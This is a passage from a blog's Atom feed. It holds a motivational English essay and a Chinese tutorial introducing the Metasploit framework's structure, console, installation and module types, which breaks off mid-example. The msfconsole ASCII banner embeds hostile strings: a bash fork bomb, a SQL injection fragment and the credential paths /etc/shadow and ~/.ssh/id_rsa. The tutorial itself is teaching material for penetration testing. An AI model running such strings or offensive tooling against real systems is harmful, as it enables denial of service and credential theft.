    <summary type="html">&lt;h1 id=&quot;【段子】千禧年难题奶茶化&quot;&gt;&lt;a href=&quot;#【段子】千禧年难题奶茶化&quot; class=&quot;headerlink&quot; title=&quot;【段子】千禧年难题奶茶化&quot;&gt;&lt;/a&gt;【段子】千禧年难题奶茶化&lt;/h1&gt;&lt;h4 id=&quot;潜入克雷数学研究所档案室，你掏出毛笔在《七大难题》</summary>
      
    
    
    
    <category term="天赋型选手一句梗，我背了三年" scheme="https://touristdaughter.cyou/categories/%E5%A4%A9%E8%B5%8B%E5%9E%8B%E9%80%89%E6%89%8B%E4%B8%80%E5%8F%A5%E6%A2%97%EF%BC%8C%E6%88%91%E8%83%8C%E4%BA%86%E4%B8%89%E5%B9%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>Article:The Power of Belief and Perseverance</title>
    <link href="https://touristdaughter.cyou/2025/04/03/Article%EF%BC%9AThe%20Power%20of%20Belief%20and%20Perseverance/"/>
    <id>https://touristdaughter.cyou/2025/04/03/Article%EF%BC%9AThe%20Power%20of%20Belief%20and%20Perseverance/</id>
    <published>2025-04-03T15:25:25.954Z</published>
    <updated>2025-04-03T15:26:14.615Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Article-The-Power-of-Belief-and-Perseverance"><a href="#Article-The-Power-of-Belief-and-Perseverance" class="headerlink" title="Article: The Power of Belief and Perseverance"></a>Article: The Power of Belief and Perseverance</h1><p>By Bryanna</p><p>In the journey of life, we often encounter obstacles that test our resolve and challenge our determination. It is during these moments that the power of belief and the importance of perseverance become most apparent. As I reflect on my own experiences, I am reminded of the profound impact that these two elements have had on my path to success.</p><h2 id="Belief-The-Foundation-of-Our-Dreams"><a href="#Belief-The-Foundation-of-Our-Dreams" class="headerlink" title="Belief: The Foundation of Our Dreams"></a>Belief: The Foundation of Our Dreams</h2><p>Belief is the cornerstone of all achievement. It is the unwavering conviction that, despite the challenges we face, we have the ability to reach our goals. Without belief, our dreams remain distant and unattainable. It is belief that fuels our passion and drives us to take the necessary steps towards our aspirations.</p><p>In my own life, belief has been the guiding force that has propelled me forward. When faced with doubt and uncertainty, it is my belief in myself and my capabilities that has allowed me to persevere. I have learned that belief is not merely a passive acceptance of one’s potential, but an active commitment to nurturing and developing it.</p><h2 id="Perseverance-The-Engine-of-Progress"><a href="#Perseverance-The-Engine-of-Progress" class="headerlink" title="Perseverance: The Engine of Progress"></a>Perseverance: The Engine of Progress</h2><p>While belief provides the foundation, it is perseverance that acts as the engine of our progress. Perseverance is the relentless pursuit of our goals, even when the path is fraught with difficulties. It is the determination to keep moving forward, regardless of the obstacles that stand in our way.</p><p>In my journey, I have encountered numerous challenges that have tested my resolve. There have been times when the weight of these challenges threatened to overwhelm me. However, it is my commitment to perseverance that has enabled me to overcome these hurdles. I have come to understand that perseverance is not just about enduring hardships, but about growing stronger through them.</p><h2 id="The-Synergy-of-Belief-and-Perseverance"><a href="#The-Synergy-of-Belief-and-Perseverance" class="headerlink" title="The Synergy of Belief and Perseverance"></a>The Synergy of Belief and Perseverance</h2><p>The true magic of success lies in the synergy between belief and perseverance. When these two forces come together, they create a powerful momentum that drives us towards our goals. Belief without perseverance is mere wishful thinking, while perseverance without belief is aimless effort. It is the combination of both that leads to meaningful and lasting achievement.</p><p>As I continue to navigate the complexities of life, I am constantly reminded of the importance of nurturing these two elements. I strive to cultivate a strong belief in myself and my abilities, while also committing to the relentless pursuit of my goals. This balance has been instrumental in my journey, and I believe it can be a guiding principle for others as well.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>In conclusion, the power of belief and the importance of perseverance cannot be overstated. They are the twin pillars upon which success is built. As we journey through life, let us hold fast to our beliefs and persevere through the challenges we face. In doing so, we unlock the potential within us and pave the way for a future filled with achievement and fulfillment.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Article-The-Power-of-Belief-and-Perseverance&quot;&gt;&lt;a href=&quot;#Article-The-Power-of-Belief-and-Perseverance&quot; class=&quot;headerlink&quot; title=&quot;Arti</summary>
      
    
    
    
    <category term="博主的观点和态度" scheme="https://touristdaughter.cyou/categories/%E5%8D%9A%E4%B8%BB%E7%9A%84%E8%A7%82%E7%82%B9%E5%92%8C%E6%80%81%E5%BA%A6/"/>
    
    
  </entry>
  
  <entry>
    <title>使用METASPLOIT框架</title>
    <link href="https://touristdaughter.cyou/2024/05/06/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/"/>
    <id>https://touristdaughter.cyou/2024/05/06/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/</id>
    <published>2024-05-06T08:34:31.642Z</published>
    <updated>2025-04-29T03:58:00.269Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>author: <a href="https://zengqi0.github.io/2023/04/23/%E4%BD%BF%E7%94%A8METASPLOIT%E6%A1%86%E6%9E%B6/">Answer_77</a></p></blockquote><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>工具最近在安全行业的社交媒体圈内引起了激烈的争论。一些讨论围绕某些群体的个人偏好展开，而另一些则旨在评估向公众公开工具的政策。然而，有必要指出自动化工具在当今行业中的重要性。</p><p>我们确实听到或将要听到的普遍意见是，在安全评估期间使用自动化工具不是正确的选择。这是因为在与易受攻击的环境交互时，它们无法为安全分析师或渗透测试人员提供“证明”自己的机会。此外，许多人表示，工具使审核员的工作变得过于简单，以至于他们的评估无法获得任何认可。</p><p>另一个声音团体不同意 - 那些由信息安全社区的新成员组成的，他们刚刚开始并迈出他们的第一步，以及那些坚持认为工具通过为我们提供对过多的用户更友好的方法来帮助我们更好地学习的论点存在于野外的漏洞，同时为我们节省了评估更复杂部分的时间。我们也将采取这种对抗性的方式来处理这个问题。</p><p>在某些情况下，工具确实会给我们带来一些缺点：</p><ul><li>创建一个难以突破的舒适区来学习新技能</li><li>仅仅因为它们在线发布供所有人查看和使用而造成安全风险</li><li>营造隧道视觉效果。<code>If the tool cannot do it, neither can I.</code></li></ul><p>​就像在工作的创造性部分可以与自动化任务相结合的其他行业一样，工具可以限制我们作为新用户的观点和行动。我们可能错误地认为<code>learn</code>它们提供了所有问题的解决方案，我们开始越来越依赖它们。反过来，这会产生一种隧道视觉效果，这种效果可以而且将会限制用户可能会考虑并采取行动进行评估的可能交互。</p><p>​与此同时，越来越多的这些自动化工具进入公共部门（参见美国国家安全局向公众发布安全工具）这一事实为几乎不了解这些工具的潜在恶意行为者创造了更多可能性行业根据他们快速获利的愿望采取行动，或者在充满小人物的黑暗房间里炫耀他们的努力。</p><h2 id="纪律"><a href="#纪律" class="headerlink" title="纪律"></a>纪律</h2><p>如果要从信息安全行业的当前状态中得出任何有辨识力的因素，则必须在我们处于现有技术、协议和系统的持续、加速演进的前提下得出这些因素。由于我们在评估期间遇到大量环境变量，因此必须尽可能节省时间，并为审核员形成强大的安全范例。纪律在所有工作领域都至关重要，结论如下：</p><table><thead><tr><th></th></tr></thead><tbody><tr><td>我们将永远没有足够的时间来完成评估。由于在每一种环境变化中使用的技术数量众多，我们将没有时间进行完整、全面的评估。时间就是金钱，我们为不懂技术的客户加班加点，我们需要先完成大部分工作：最具潜在影响和修复周转率最高的问题。</td></tr><tr><td>即使我们制作工具或手动利用每项服务，可信度也可能成为问题。我们不是与其他行业成员竞争，而是与客户管理层预先设定的经济条件和个人信念竞争。他们不会理解或非常重视荣誉。他们只希望在最短的时间内完成尽可能多的工作。</td></tr><tr><td>您只需要打动自己，而不是信息安全社区。如果我们做到了前者，后者自然会到来。使用与上述相同的示例，许多在线存在的艺术家在追求在线验证时偏离了最初的目标。他们的艺术对于敏锐的眼睛来说变得陈旧和普通，但对于日常用户来说，它包含了他们想要的视觉元素和主题，而不是那些他们的追随者还不知道他们想要的。作为安全研究人员或渗透测试人员，我们只需要验证漏洞，而不是验证我们的自我。</td></tr></tbody></table><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>我们必须从内到外分析和了解我们的工具，以保持我们的踪迹并避免在评估期间发生灾难性事件。许多工具可以证明是不可预测的。有些可能会在目标系统上留下活动痕迹，有些可能会让我们的攻击者平台敞开大门。尽管如此，只要我们遵守此处的规则，它们就可以成为初学者的宝贵教育平台，以及专业人士所需的节省时间的机制。</p><p>不要有隧道视野。将该工具用作工具，而不是我们完整评估的支柱或生命支持。</p><p>请阅读您可以找到的有关我们任何工具的所有技术文档。请深入了解他们。千方百计（或函数或类）。这将帮助我们避免意外行为或愤怒的客户和律师团队。</p><p>假设我们审核我们的工具并为自己设置一个可靠的方法来进行初步检查和攻击路径。在这种情况下，工具将为我们节省进一步研究和对我们的安全研究范式进行长期具体探索的时间。考虑到越来越多的技术出现在当今环境中的速度越来越快，这项进一步的研究应该侧重于对安全机制的更深入理解，进一步对更抽象的安全对象进行审计，以扩大分析范围。这就是我们作为专业人士的发展方式。</p><h1 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a>Metasploit简介</h1><p>​这<code>Metasploit Project</code>是一个基于 Ruby 的模块化渗透测试平台，使您能够编写、测试和执行漏洞利用代码。该漏洞利用代码可以由用户定制，也可以从包含已发现的最新模块化漏洞利用的数据库中获取。其中<code>Metasploit Framework</code>包括一套工具，可用于测试安全漏洞、枚举网络、执行攻击和逃避检测。其核心<code>Metasploit Project</code>是一组常用工具，为渗透测试和漏洞利用开发提供了完整的环境。</p><p><img src="/img/METASPLOIT1.png"></p><p>​提到<code>modules</code>的是实际的漏洞利用概念验证，已经在野外开发和测试并集成在框架内，以便渗透测试人员可以轻松访问针对不同平台和服务的不同攻击向量。Metasploit 不是万事通，而是一把瑞士军刀，其工具足以帮助我们解决最常见的未修补漏洞。</p><p>​它的强项在于它提供了大量可用的目标和版本，所有这些都离成功的立足点很远。这些，结合为那些易受攻击的版本量身定制的漏洞利用以及在漏洞利用后发送的有效负载，这将使我们能够实际访问系统，为我们提供了一种简单、自动化的方式来在我们的帖子期间在目标连接之间切换- 开发企业。</p><h2 id="Metasploit-Pro"><a href="#Metasploit-Pro" class="headerlink" title="Metasploit Pro"></a>Metasploit Pro</h2><p><code>Metasploit</code>作为一个产品分为两个版本。该<code>Metasploit Pro</code>版本与具有一些附加功能的版本不同<code>Metasploit Framework</code>：</p><ul><li>任务链</li><li>社会工程学</li><li>漏洞验证</li><li>图形用户界面</li><li>快速启动向导</li><li>集成</li></ul><p>如果您更喜欢命令行用户并且更喜欢额外的功能，那么专业版还包含自己的控制台，就像<code>msfconsole</code>.</p><p>要大致了解 Metasploit Pro 的最新功能可以实现什么，请查看以下列表：</p><table><thead><tr><th><strong>浸润</strong></th><th><strong>收集数据</strong></th><th><strong>修复</strong></th></tr></thead><tbody><tr><td>手动开发</td><td>导入和扫描数据</td><td>暴力破解</td></tr><tr><td>防病毒规避</td><td>发现扫描</td><td>任务链</td></tr><tr><td>IPS&#x2F;IDS规避</td><td>元模块</td><td>开发工作流程</td></tr><tr><td>代理枢轴</td><td>Nexpose 扫描集成</td><td>会话重新运行</td></tr><tr><td>开发后</td><td></td><td>任务回放</td></tr><tr><td>会话清理</td><td></td><td>项目声纳集成</td></tr><tr><td>凭据重用</td><td></td><td>会话管理</td></tr><tr><td>社会工程学</td><td></td><td>凭证管理</td></tr><tr><td>有效载荷生成器</td><td></td><td>团队协作</td></tr><tr><td>快速渗透测试</td><td></td><td>网络界面</td></tr><tr><td>VPN 枢轴</td><td></td><td>备份还原</td></tr><tr><td>漏洞验证</td><td></td><td>数据导出</td></tr><tr><td>网络钓鱼向导</td><td></td><td>证据收集</td></tr><tr><td>网络应用测试</td><td></td><td>报告</td></tr><tr><td>持久会话</td><td></td><td>标记数据</td></tr></tbody></table><h2 id="Metasploit-框架控制台"><a href="#Metasploit-框架控制台" class="headerlink" title="Metasploit 框架控制台"></a>Metasploit 框架控制台</h2><p>可能<code>msfconsole</code>是最流行的<code>Metasploit Framework</code> <code>(MSF)</code>. 它提供了一个“一体式”集中式控制台，并允许您高效地访问<code>MSF</code>. <code>Msfconsole</code>一开始可能看起来很吓人，但是一旦您了解了命令的语法，您就会学会欣赏使用此界面的强大功能。</p><p>一般带来的功能<code>msfconsole</code>有以下几点：</p><ul><li>这是访问其中大部分功能的唯一受支持的方式<code>Metasploit</code></li><li>提供基于控制台的界面<code>Framework</code></li><li>包含最多的功能，是最稳定的<code>MSF</code>界面</li><li>完整的 readline 支持、制表符和命令完成</li><li>执行外部命令<code>msfconsole</code></li></ul><p>上述两种产品都带有一个广泛的可用模块数据库，可用于我们的评估。这些与外部命令（如扫描器、社会工程工具包和有效负载生成器）的使用相结合，可以将我们的设置变成一个随时可用的机器，使我们能够通过使用无缝地控制和操纵野外的不同漏洞会话和作业的方式与我们在 Internet 浏览器上看到选项卡的方式相同。</p><p>这里的关键术语是可用性——用户体验。我们可以轻松控制控制台可以改善我们的学习体验。因此，让我们深入研究细节。</p><h2 id="了解架构"><a href="#了解架构" class="headerlink" title="了解架构"></a>了解架构</h2><p>要完全操作我们正在使用的任何工具，我们必须首先了解它的内部结构。这是一种很好的做法，它可以让我们更好地了解当该工具发挥作用时我们的安全评估过程中会发生什么。重要的是不要使用<a href="https://blog.cobaltstrike.com/2016/09/28/cobalt-strike-rce-active-exploitation-reported/">任何可能使您或您的客户面临数据泄露风险的通配符</a>。</p><p><code>/usr/share/metasploit-framework</code>默认情况下，所有与 Metasploit Framework 相关的基础文件都可以在我们的发行版中找到<code>ParrotOS Security</code>。</p><h4 id="数据、文档、库"><a href="#数据、文档、库" class="headerlink" title="数据、文档、库"></a>数据、文档、库</h4><p>这些是框架的基础文件。Data 和 Lib 是 msfconsole 界面的功能部分，而 Documentation 文件夹包含有关该项目的所有技术细节。</p><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p>上面详述的模块在此文件夹中分为不同的类别。我们将在下一节中详细介绍这些内容。它们包含在以下文件夹中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/modules</span><br><span class="line"></span><br><span class="line">auxiliary  encoders  evasion  exploits  nops  payloads  post</span><br></pre></td></tr></table></figure><h4 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h4><p>插件在使用时为渗透测试人员提供了更大的灵活性，<code>msfconsole</code>因为它们可以根据需要轻松地手动或自动加载，以在我们的评估期间提供额外的功能和自动化。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/plugins/</span><br><span class="line"></span><br><span class="line">aggregator.rb      ips_filter.rb  openvas.rb           sounds.rb</span><br><span class="line">alias.rb           komand.rb      pcap_log.rb          sqlmap.rb</span><br><span class="line">auto_add_route.rb  lab.rb         request.rb           thread.rb</span><br><span class="line">beholder.rb        libnotify.rb   rssfeed.rb           token_adduser.rb</span><br><span class="line">db_credcollect.rb  msfd.rb        sample.rb            token_hunter.rb</span><br><span class="line">db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb</span><br><span class="line">event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb</span><br><span class="line">ffautoregen.rb     nexpose.rb     socket_logger.rb</span><br></pre></td></tr></table></figure><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>Meterpreter 功能和其他有用的脚本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/scripts/</span><br><span class="line"></span><br><span class="line">meterpreter  ps  resource  shell</span><br></pre></td></tr></table></figure><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p>可以直接从菜单调用的命令行实用程序<code>msfconsole</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ ls /usr/share/metasploit-framework/tools/</span><br><span class="line"></span><br><span class="line">context  docs     hardware  modules   payloads</span><br><span class="line">dev      exploit  memdump   password  recon</span><br></pre></td></tr></table></figure><p>现在我们知道了所有这些位置，当我们决定导入新模块甚至从头开始创建新模块时，我们将来可以很容易地引用它们。</p><h2 id="MSF控制台简介"><a href="#MSF控制台简介" class="headerlink" title="MSF控制台简介"></a>MSF控制台简介</h2><p>要开始与 Metasploit Framework 交互，我们需要输入<code>msfconsole</code>我们选择的终端。许多面向安全的发行版（例如 Parrot Security 和 Kali Linux）都预装了<code>msfconsole</code>。与任何其他命令行工具一样，我们可以在启动脚本时使用其他几个选项。这些从图形显示开关&#x2F;选项到程序开关&#x2F;选项不等。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>启动后<code>msfconsole</code>，我们会看到他们创造的启动画面和命令行提示符，等待我们的第一个命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">nswer77@htb[/htb]$ msfconsole</span><br><span class="line">                                                  </span><br><span class="line">                                              `:oDFo:`                            </span><br><span class="line">                                           ./ymM0dayMmy/.                          </span><br><span class="line">                                        -+dHJ5aGFyZGVyIQ==+-                    </span><br><span class="line">                                    `:sm⏣~~Destroy.No.Data~~s:`                </span><br><span class="line">                                 -+h2~~Maintain.No.Persistence~~h+-              </span><br><span class="line">                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          </span><br><span class="line">                          ./etc/shadow.0days-Data&#x27;%20OR%201=1--.No.0MN8&#x27;/.      </span><br><span class="line">                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    </span><br><span class="line">                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  </span><br><span class="line">                      :dopeAW.No&lt;nano&gt;o                     :is:TЯiKC.sudo-.A:  </span><br><span class="line">                      :we&#x27;re.all.alike&#x27;`                     The.PFYroy.No.D7:  </span><br><span class="line">                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    </span><br><span class="line">                      :msf&gt;exploit -j.                       :Ns.BOB&amp;ALICEes7:    </span><br><span class="line">                      :---srwxrwx:-.`                        `MS146.52.No.Per:    </span><br><span class="line">                      :&lt;script&gt;.Ac816/                        sENbove3101.404:    </span><br><span class="line">                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    </span><br><span class="line">                      :09.14.2011.raid                       /STFU|wall.No.Pr:    </span><br><span class="line">                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    </span><br><span class="line">                      :#OUTHOUSE-  -s:                       /corykennedyData:    </span><br><span class="line">                      :$nmap -oS                              SSo.6178306Ence:    </span><br><span class="line">                      :Awsm.da:                            /shMTl#beats3o.No.:    </span><br><span class="line">                      :Ring0:                             `dDestRoyREXKC3ta/M:    </span><br><span class="line">                      :23d:                               sSETEC.ASTRONOMYist:    </span><br><span class="line">                       /-                        /yo-    .ence.N:()&#123; :|: &amp; &#125;;:    </span><br><span class="line">                                                 `:Shall.We.Play.A.Game?tron/    </span><br><span class="line">                                                 ```-ooy.if1ghtf0r+ehUser5`    </span><br><span class="line">                                               ..th3.H1V3.U2VjRFNN.jMh+.`          </span><br><span class="line">                                              `MjM~~WE.ARE.se~~MMjMs              </span><br><span class="line">                                               +~KANSAS.CITY&#x27;s~-`                  </span><br><span class="line">                                                J~HAKCERS~./.`                    </span><br><span class="line">                                                .esc:wq!:`                        </span><br><span class="line">                                                 +++ATH`                            </span><br><span class="line">                                                  `</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.1.9-dev                           ]</span><br><span class="line">+ -- --=[ 2169 exploits - 1149 auxiliary - 398 post       ]</span><br><span class="line">+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Use sessions -1 to interact with the last opened session</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure><p>或者，我们可以使用<code>-q</code>不显示横幅的选项。</p><p> 启动 MSF 控制台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ msfconsole -q</span><br><span class="line"></span><br><span class="line">msf6 &gt; </span><br></pre></td></tr></table></figure><p>为了更好地查看所有可用命令，我们可以键入命令<code>help</code>。首先，我们的工具需要锋利。我们需要做的第一件事就是确保构成框架的模块是最新的，并且可以导入任何可供公众使用的新模块。</p><p>旧方法是<code>msfupdate</code>在我们的 OS 终端（外部<code>msfconsole</code>）中运行。但是，<code>apt</code>包管理器目前可以毫不费力地处理模块和功能的更新。</p><h4 id="安装-MSF"><a href="#安装-MSF" class="headerlink" title="安装 MSF"></a>安装 MSF</h4><p> 安装 MSF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vnswer77@htb[/htb]$ sudo apt update &amp;&amp; sudo apt install metasploit-framework</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">(Reading database ... 414458 files and directories currently installed.)</span><br><span class="line">Preparing to unpack .../metasploit-framework_6.0.2-0parrot1_amd64.deb ...</span><br><span class="line">Unpacking metasploit-framework (6.0.2-0parrot1) over (5.0.88-0kali1) ...</span><br><span class="line">Setting up metasploit-framework (6.0.2-0parrot1) ...</span><br><span class="line">Processing triggers for man-db (2.9.1-1) ...</span><br><span class="line">Scanning application launchers</span><br><span class="line">Removing duplicate launchers from Debian</span><br><span class="line">Launchers are updated</span><br></pre></td></tr></table></figure><p>我们将在本模块中介绍的首要步骤之一是<code>exploit</code>为我们的<code>target</code>. 然而，在尝试任何利用之前，我们需要对自身有一个详细的了解<code>target</code>。这涉及<code>Enumeration</code>在任何类型的利用尝试之前的过程。</p><p>在 期间<code>Enumeration</code>，我们必须查看我们的目标并确定其上运行的是哪些面向公众的服务。例如，它是一个 HTTP 服务器吗？它是一个FTP服务器吗？它是 SQL 数据库吗？这些不同的<code>target</code>类型在现实世界中差别很大。我们需要从全面了解<code>scan</code>目标的 IP 地址开始，以确定正在运行的服务以及为每个服务安装的版本。</p><p>我们会注意到，在我们进行过程中，版本是该过程中的关键组件<code>Enumeration</code>，它将使我们能够确定目标是否易受攻击。以前易受攻击的服务的未修补版本或可公开访问的平台中的过时代码通常是我们进入系统的入口点<code>target</code>。</p><hr><h2 id="MSF-参与结构"><a href="#MSF-参与结构" class="headerlink" title="MSF 参与结构"></a>MSF 参与结构</h2><p>MSF 参与结构可分为五个主要类别。</p><ul><li>枚举</li><li>准备</li><li>开发</li><li>特权升级</li><li>开发后</li></ul><p>这种划分使我们更容易以更结构化的方式查找和选择适当的 MSF 功能，并相应地使用它们。这些类别中的每一个都有用于特定目的的不同子类别。这些包括，例如，服务验证和漏洞研究。</p><p>因此，我们熟悉这种结构至关重要。因此，我们将查看此框架的组件以更好地理解它们之间的关系。</p><p><img src="/img/METASPLOIT2.png"></p><p>我们将在本模块中逐一介绍这些类别，但我们建议您自己查看各个组件并深入挖掘。尝试不同的功能是学习新工具或技能不可或缺的一部分。因此，我们应该在接下来的实验室中尝试所有可以想象到的东西，并独立分析结果。</p><h2 id="模块-1"><a href="#模块-1" class="headerlink" title="模块"></a>模块</h2><p>正如我们之前提到的，Metasploit<code>modules</code>是具有特定目的和相应功能的准备脚本，这些脚本已经在野外开发和测试过。该<code>exploit</code>类别由所谓的概念验证 ( <code>POCs</code>) 组成，可用于以很大程度上自动化的方式利用现有漏洞。很多人常常认为，漏洞利用的失败证明了疑似漏洞的存在。然而，这只是证明 Metasploit 漏洞不起作用，并不能证明该漏洞不存在。这是因为许多漏洞需要根据目标主机进行定制才能使漏洞发挥作用。因此，诸如 Metasploit 框架之类的自动化工具只能被视为一种支持工具，不能替代我们的手动技能。</p><p>一旦进入<code>msfconsole</code>，我们就可以从包含所有可用 Metasploit 模块的广泛列表中进行选择。它们中的每一个都被组织成文件夹，如下所示：</p><h4 id="句法"><a href="#句法" class="headerlink" title="句法"></a>句法</h4><p> 句法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;No.&gt; &lt;type&gt;/&lt;os&gt;/&lt;service&gt;/&lt;name&gt;</span><br></pre></td></tr></table></figure><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p> 例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">794   exploit/windows/ftp/scriptftp_list</span><br></pre></td></tr></table></figure><h4 id="索引号"><a href="#索引号" class="headerlink" title="索引号"></a>索引号</h4><p>将显示标签<code>No.</code>以选择我们之后在搜索过程中想要的漏洞利用。稍后我们将看到<code>No.</code>标签对选择特定的 Metasploit 模块有多大帮助。</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><p>标签<code>Type</code>是 Metasploit 之间的第一级隔离<code>modules</code>。查看此字段，我们可以知道此模块的代码段将完成什么。例如，其中一些<code>types</code>不能像模块那样直接使用。<code>exploit</code>但是，他们将在可交互的结构旁边引入结构，以实现更好的模块化。为了更好地解释，以下是该字段中可能出现的类型：</p><table><thead><tr><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。</td></tr><tr><td><code>Encoders</code></td><td>确保有效负载完好无损地到达目的地。</td></tr><tr><td><code>Exploits</code></td><td>定义为利用允许有效载荷传递的漏洞的模块。</td></tr><tr><td><code>NOPs</code></td><td>（无操作代码）在攻击尝试中保持负载大小一致。</td></tr><tr><td><code>Payloads</code></td><td>代码远程运行并回调攻击者机器以建立连接（或 shell）。</td></tr><tr><td><code>Plugins</code></td><td>附加脚本可以集成在一个评估中并<code>msfconsole</code>与之共存。</td></tr><tr><td><code>Post</code></td><td>用于收集信息、深入研究等的广泛模块。</td></tr></tbody></table><p>请注意，在选择用于有效载荷传输的模块时，该命令只能与以下可用作（或可交互模块）<code>use &lt;no.&gt;</code>的模块一起使用：<code>initiators</code></p><table><thead><tr><th><strong>类型</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Auxiliary</code></td><td>扫描、模糊测试、嗅探和管理功能。提供额外的帮助和功能。</td></tr><tr><td><code>Exploits</code></td><td>定义为利用允许有效载荷传递的漏洞的模块。</td></tr><tr><td><code>Post</code></td><td>用于收集信息、深入研究等的广泛模块。</td></tr></tbody></table><h4 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h4><p>该<code>OS</code>标记指定为哪个操作系统和体系结构创建模块。自然地，不同的操作系统需要运行不同的代码以获得期望的结果。</p><h4 id="servive"><a href="#servive" class="headerlink" title="servive"></a>servive</h4><p>该<code>Service</code>标签指的是目标机器上运行的易受攻击的服务。对于某些模块，例如 the<code>auxiliary</code>或<code>post</code>ones，此标记可以指更一般的活动<code>gather</code>，例如，指的是收集凭据。</p><h4 id="name"><a href="#name" class="headerlink" title="name"></a>name</h4><p>最后，<code>Name</code>标签解释了使用为特定目的创建的模块可以执行的实际操作。</p><h2 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h2><p>Metasploit 还为现有模块提供完善的搜索功能。借助此功能，我们可以使用 specific 快速搜索所有模块，<code>tags</code>以找到适合我们目标的模块。</p><h4 id="MSF-搜索功能"><a href="#MSF-搜索功能" class="headerlink" title="MSF - 搜索功能"></a>MSF - 搜索功能</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 